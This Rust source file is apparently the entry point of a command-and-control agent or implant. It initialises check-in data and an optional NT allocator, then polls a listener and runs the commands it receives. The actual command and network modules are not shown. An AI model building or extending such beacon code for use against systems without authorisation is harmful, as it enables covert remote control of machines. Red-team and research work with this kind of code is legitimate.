use libc_print::libc_println;
use std::{thread, time::Duration};
use tokio::runtime::Runtime;

pub mod commands;
pub mod init;

use commands::command_handler;

#[cfg(feature = "ntallocator")]
use mod_ntallocator::NtAllocator;

// Set a custom global allocator
#[cfg(feature = "ntallocator")]
#[global_allocator]
static GLOBAL: NtAllocator = NtAllocator;

use init::{init_checkin_data, init_global_instance, init_protocol};
use mod_agentcore::instance;

/// Main routine that initializes the runtime and repeatedly checks the connection status.
pub fn routine() {
    let rt = Runtime::new().unwrap(); // Create a new Tokio runtime
    loop {
        unsafe {
            if !instance().session.connected {
                // If not connected, try to connect to the listener
                rt.block_on(async {
                    init_protocol().await;
                });
            }

            if instance().session.connected {
                // If connected, handle incoming commands
                command_handler();
            }

            // Sleep for 15 seconds before checking again
            libc_println!("Sleep: {}", instance().config.polling_interval);
            thread::sleep(Duration::from_secs(
                instance().config.polling_interval as u64,
            ));
        }
    }
}

/// Main function that initializes the global instance, checkin data, and starts the routine.
fn main() {
    unsafe {
        init_global_instance(); // Initialize global instance
        init_checkin_data(); // Initialize checkin data
        routine(); // Start the main routine
    }
}
